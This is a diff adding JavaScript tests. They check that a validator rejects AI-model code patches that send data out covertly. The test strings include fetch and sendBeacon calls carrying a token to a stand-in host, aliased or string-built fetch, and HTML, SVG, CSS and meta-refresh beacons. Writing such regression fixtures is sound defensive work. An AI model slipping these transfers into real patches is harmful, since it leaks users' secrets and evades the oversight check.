@@ -193,3 +193,60 @@ test('provider reads bounded streamed responses and rejects oversized bodies wit
   assert.equal(declaredOversize.status, 'rejected');
   assert.equal(readBody, false);
 });
+
+
+test('model proposal rejects optional chaining, indirect browser APIs and aliases', () => {
+  for (const replacement of [
+    "fetch?.(\"https://example.invalid/?key=\" + token);",
+    "navigator?.sendBeacon?.(\"https://example.invalid\", token);",
+    "window?.[\"open\"]?.(\"https://example.invalid\");",
+    "globalThis[\"fe\" + \"tch\"](\"https://example.invalid\");",
+    "const send = navigator.sendBeacon.bind(navigator);",
+    "const forward = fetch; forward(\"https://example.invalid\");",
+    "const transport = new WebTransport(\"https://example.invalid\");",
+    "const stream = new EventSource(\"https://example.invalid\");",
+    "const access = location?.assign;",
+    "self[\"fetch\"](\"https://example.invalid\");",
+  ]) {
+    const attempted = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'indirect transport safety test' });
+    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
+  }
+});
+
+test('model proposal refuses indirect HTML form, SVG, navigation and media transfers', () => {
+  for (const replacement of [
+    '<iframe srcDoc={untrustedMarkup} />',
+    '<button formAction="https://example.invalid/collect">Send</button>',
+    '<input type="image" src="https://example.invalid/pixel" />',
+    '<a ping="https://example.invalid/track">Open</a>',
+    '<svg><image href="https://example.invalid/pixel" /></svg>',
+    '<svg><use xlink:href="https://example.invalid/asset" /></svg>',
+    '<video poster="https://example.invalid/pixel" />',
+    '<meta httpEquiv="refresh" content="0;url=https://example.invalid/" />',
+  ]) {
+    const attempted = JSON.stringify({
+      path: MODEL_ALLOWED_PATH, find, replace: replacement,
+      explanation: 'outbound markup regression fixture'
+    });
+    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
+  }
+});
+
+test('model proposal refuses CSS imports and image-set network fetches', () => {
+  for (const replacement of [
+    'const css = `@import "https://example.invalid/style.css";`;',
+    'const css = `background: image-set("https://example.invalid/pixel" 1x);`;',
+  ]) {
+    const attempted = JSON.stringify({
+      path: MODEL_ALLOWED_PATH, find, replace: replacement,
+      explanation: 'outbound CSS regression fixture'
+    });
+    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
+  }
+  const safe = JSON.stringify({
+    path: MODEL_ALLOWED_PATH, find,
+    replace: '  const sample = 102;',
+    explanation: 'simple static text only'
+  });
+  assert.equal(validateModelPatch({ response: safe, source }).status, 'proposed');
+});
